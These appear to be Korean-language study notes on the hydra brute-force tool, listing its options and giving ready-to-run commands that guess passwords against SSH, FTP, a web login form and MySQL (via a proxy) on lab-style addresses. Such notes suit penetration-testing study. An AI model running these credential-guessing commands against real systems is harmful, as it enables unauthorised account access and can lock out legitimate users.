# hydra

- 온라인 로그인 브루트포스 도구 hydra — -l/-L·-P로 계정·패스워드 리스트를 넣고 서비스 모듈로 대상에 직접 인증을 시도(^USER^·^PASS^ 치환, F= 실패 문구 판정)
- SSH·FTP·웹 로그인 폼·MySQL 등 살아있는 서비스에 자격증명 브루트포스를 시도할 때. 오프라인 해시 크래킹(hashcat)과 달리 네트워크 서비스 대상
- 대상 서비스 포트 접근 가능(22/21/80 등), hydra 설치(apt install hydra), 워드리스트(rockyou.txt·SecLists) — -t 스레드 과다 시 차단·계정 잠금 위험, 세션 쿠키 필요 폼은 H=Cookie: 헤더 추가
- 프로토콜별 상세 명령은 `hydra_ssh.md`, `hydra_ftp.md`, `hydra_http.md` 참고. 공통 옵션·전체 절차는 `hydra_structured.md`, 실습 기록은 `hydra_practice.md`

## 주요 옵션

- `-l` : 단일 사용자명
- `-L` : 사용자명 리스트
- `-p` : 단일 패스워드
- `-P` : 패스워드 리스트
- `-s` : 포트 지정
- `-V` : 시도하는 계정/패스워드 실시간 출력
- `-t` : 동시 스레드 수 (기본 16)
- `-f` : 첫 성공시 멈춤
- `-F` : 모든 로그인 찾기
- `-o` : 결과 파일 저장
- `-M` : 대상 리스트 (여러 IP)
- `-e nsr` : 빈 패스워드(n), 사용자명=패스워드(s), 역순(r)도 시도

## 설치 (kali는 기본 설치)

```bash
sudo apt update && sudo apt install -y hydra
hydra --version
```

## 기본 명령어 구조

```bash
hydra [옵션] -l <사용자명> -P <패스워드리스트> <타겟> <서비스>
```

## 빠른 예시

```bash
# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# FTP
hydra -l anonymous -P pass.txt ftp://10.10.10.10

# HTTP POST 로그인 폼
hydra -l admin -P passwords.txt 10.10.10.10 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=로그인실패문구"
```

## 결과 예시

```
[22][ssh] host: 10.10.10.10 login: root password: 123456
```

## 프록시 경유 (DB 브루트포스 예)

```bash
HYDRA_PROXY=http://192.168.199.189:3128 hydra -l root -P passes.txt -s 3307 127.0.0.1 mysql -t 4 -f -V
```